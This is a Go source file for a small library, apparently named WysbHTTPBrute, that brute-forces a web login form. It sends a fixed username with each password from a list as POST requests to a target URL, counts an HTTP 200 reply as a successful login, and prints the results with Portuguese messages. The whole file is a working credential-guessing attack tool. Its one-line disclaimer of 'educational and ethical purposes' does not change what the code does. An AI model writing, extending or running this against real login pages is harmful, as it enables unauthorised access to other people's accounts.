package WysbHTTPBrute

import (
	"bytes"
	"fmt"
	"net/http"
	"sync"
)

type BruteForcer struct {
	TargetURL string
	Username  string
	Passwords []string
	Results   map[string]string
	mu        sync.Mutex
}

func NewBruteForcer(targetURL, username string, passwords []string) *BruteForcer {
	return &BruteForcer{
		TargetURL: targetURL,
		Username:  username,
		Passwords: passwords,
		Results:   make(map[string]string),
	}
}

func (bf *BruteForcer) Start() {
	var wg sync.WaitGroup

	for _, password := range bf.Passwords {
		wg.Add(1)
		go func(password string) {
			defer wg.Done()
			bf.attemptLogin(password)
		}(password)
	}

	wg.Wait()
	bf.PrintResults()
}

func (bf *BruteForcer) attemptLogin(password string) {
	bf.mu.Lock()
	defer bf.mu.Unlock()

	client := &http.Client{}
	data := fmt.Sprintf("username=%s&password=%s", bf.Username, password)
	req, err := http.NewRequest("POST", bf.TargetURL, bytes.NewBuffer([]byte(data)))
	if err != nil {
		return
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	resp, err := client.Do(req)
	if err == nil {
		defer resp.Body.Close()
		if resp.StatusCode == 200 {
			bf.Results[password] = "Login bem-sucedido"
		} else {
			bf.Results[password] = "Login falhou"
		}
	} else {
		bf.Results[password] = "Erro na requisição"
	}
}

func (bf *BruteForcer) PrintResults() {
	for password, result := range bf.Results {
		fmt.Printf("Senha: %s - Resultado: %s\n", password, result)
	}
}

func Disclaimer() {
	fmt.Println("This library is for educational and ethical purposes. The creator is not responsible for misuse.")
}
